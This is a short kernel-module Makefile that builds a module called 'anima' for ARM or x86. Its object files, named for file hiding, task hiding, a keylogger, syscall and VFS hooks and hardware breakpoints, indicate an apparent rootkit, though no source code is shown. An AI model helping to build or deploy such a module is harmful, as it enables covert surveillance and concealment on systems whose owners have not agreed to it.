obj-m += anima.o
anima-objs := init.o debug.o hide_file.o hide_task.o keylogger.o ksyms.o libc.o syscalls.o vfs.o

EXTRA_CFLAGS = -std=gnu99 -I$(PWD)/../include

ifeq ($(ARCH), arm)
	anima-objs += arm_hw_breakpoint.o arm_utils.o
	EXTRA_CFLAGS += -DARCH_ARM
endif

ifeq ($(ARCH), x86)
	anima-objs += x86_hw_breakpoint.o x86_utils.o
	EXTRA_CFLAGS += -DARCH_X86
endif

ifeq ($(DEBUG), 1)
	EXTRA_CFLAGS += -DDEBUG
endif

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) EXTRA_CFLAGS="$(EXTRA_CFLAGS)" modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) EXTRA_CFLAGS="$(EXTRA_CFLAGS)" clean
